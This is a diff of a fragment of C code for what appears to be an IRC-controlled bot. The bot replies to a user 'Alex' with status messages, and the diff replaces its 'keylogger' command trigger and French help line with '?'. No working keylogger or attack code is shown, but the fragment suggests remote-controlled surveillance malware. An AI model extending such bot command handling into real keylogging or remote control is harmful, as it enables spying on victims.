@@ -39,10 +39,10 @@ int main(int argc, char **argv) {
                 my_send(sockfd, out, debug);
 
             }
-            if (strstr(recvline, "keylogger") != NULL) {
+            if (strstr(recvline, "?") != NULL) {
                 out[0] = 0;
                 pos = strstr(recvline, " ")+1;
-                sprintf(out, "privmsg Alex Keylogger: on \r\n");
+                sprintf(out, "privmsg Alex ?: on \r\n");
                 my_send(sockfd, out, debug);
 
             }
@@ -57,7 +57,7 @@ int main(int argc, char **argv) {
                 out[0] = 0;
                 pos = strstr(recvline, " ")+1;
                 sprintf(out, "privmsg Alex Liste des commandes :\r\n");
-                sprintf(out, "privmsg Alex Keylogger : active le keylogger\r\n");
+                sprintf(out, "privmsg Alex ? : active le ?\r\n");
                 my_send(sockfd, out, debug);
 
             }
